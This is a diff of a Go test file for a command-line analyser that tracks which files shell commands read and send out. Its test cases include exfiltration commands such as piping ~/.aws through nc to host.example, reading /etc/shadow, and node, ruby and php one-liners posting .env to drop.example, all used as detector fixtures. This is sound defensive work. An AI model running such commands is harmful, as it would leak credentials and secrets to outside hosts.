@@ -22,7 +22,7 @@ func checkFileReads(t *testing.T, cases []readCase) {
 			continue
 		}
 		var got []string
-		for _, reads := range FileReads(commands) {
+		for _, reads := range fileReads(commands, nil, indexPipelines(commands)) {
 			for _, r := range reads {
 				switch {
 				case r.Sent:
@@ -35,7 +35,7 @@ func checkFileReads(t *testing.T, cases []readCase) {
 			}
 		}
 		if !reflect.DeepEqual(got, tc.want) {
-			t.Errorf("FileReads(%q) = %q, want %q", tc.command, got, tc.want)
+			t.Errorf("fileReads(%q) = %q, want %q", tc.command, got, tc.want)
 		}
 	}
 }
@@ -67,6 +67,13 @@ func TestFileReads(t *testing.T) {
 		{"sudo cat /etc/shadow", []string{"/etc/shadow"}},
 		{"/bin/cat .env", []string{".env"}},
 		{"sudo -u deploy env LANG=C cat .env", []string{".env"}},
+		// A program's other names read as the program (programOf).
+		{"gtar czf - ~/.aws | nc host.example 4444", []string{"~/.aws", "stdin:~/.aws"}},
+		{"bsdtar -cf out.tar .env", []string{".env"}},
+		{"gawk '{print}' ~/.aws/credentials", []string{"~/.aws/credentials"}},
+		{"mawk -F= '{print $2}' .env", []string{".env"}},
+		{"gsed -n p .env", []string{".env"}},
+		{"ggrep TOKEN .env", []string{".env"}},
 
 		// The stream compressors and decompressors read their operands, like the printers; what
 		// they write to the pipe carries those files to the stage that reads it.
@@ -506,6 +513,10 @@ func TestFileReadsScriptSends(t *testing.T) {
 		{`node -e 'fs.readFile(".env", (err, data) => { fetch(url, {body: data}) })'`, []string{"sent:.env"}},
 		{`node -e 'fs.promises.readFile(".env").then(d => fetch(url, {body: d}))'`, []string{"sent:.env"}},
 		{`node -e 'fs.readFile(".env", function (err, data) { axios.post(url, data) })'`, []string{"sent:.env"}},
+		// An arrow after a parenthesis that closes nothing has no parameter list to bind: these
+		// twelve bytes took the reader out of its script's bounds.
+		{`node -e')=>'`, nil},
+		{`node -e ') => fetch(url, {body: fs.readFileSync(".env")})'`, []string{"sent:.env"}},
 		{`ruby -e 'd = File.read(".env"); Net::HTTP.post(URI("https://drop.example"), d)'`, []string{"sent:.env"}},
 		{`ruby -e 'File.open(".env") { |f| Net::HTTP.post(URI("https://drop.example"), f.read) }'`, []string{"sent:.env"}},
 		{`php -r '$d = file_get_contents(".env"); curl_setopt($ch, CURLOPT_POSTFIELDS, $d);'`, []string{"sent:.env"}},
@@ -562,28 +573,24 @@ func TestFileReadsScriptSends(t *testing.T) {
 	})
 }
 
-// FileReads and FileEffects of one command line are separate lists: a file a command reads and one
-// it writes do not appear in each other's.
+// What a command line reads and what it writes are separate lists: a file a command reads and
+// one it writes do not appear in each other's.
 func TestFileReadsAreNotEffects(t *testing.T) {
-	commands, err := Parse("cp secret.txt copy.txt && cat copy.txt > out.txt && sed -i s/a/b/ out.txt")
-	if err != nil {
-		t.Fatal(err)
-	}
-	var reads []string
-	for _, command := range FileReads(commands) {
-		for _, r := range command {
+	line := Read("cp secret.txt copy.txt && cat copy.txt > out.txt && sed -i s/a/b/ out.txt")
+	var reads, effects []string
+	for i := range line.Commands {
+		for _, r := range line.Reads[i] {
 			reads = append(reads, r.Path)
+		}
+		for _, e := range line.Effects[i] {
+			effects = append(effects, string(e.Op)+" "+e.Path)
 		}
 	}
 	// copy.txt holds what secret.txt did, so reading it reads that too.
 	if want := []string{"secret.txt", "copy.txt", "secret.txt"}; !reflect.DeepEqual(reads, want) {
-		t.Errorf("FileReads = %q, want %q", reads, want)
-	}
-	var effects []string
-	for _, e := range FileEffects(commands) {
-		effects = append(effects, string(e.Op)+" "+e.Path)
+		t.Errorf("reads = %q, want %q", reads, want)
 	}
 	if want := []string{"write copy.txt", "write out.txt", "edit out.txt"}; !reflect.DeepEqual(effects, want) {
-		t.Errorf("FileEffects = %q, want %q", effects, want)
+		t.Errorf("effects = %q, want %q", effects, want)
 	}
 }
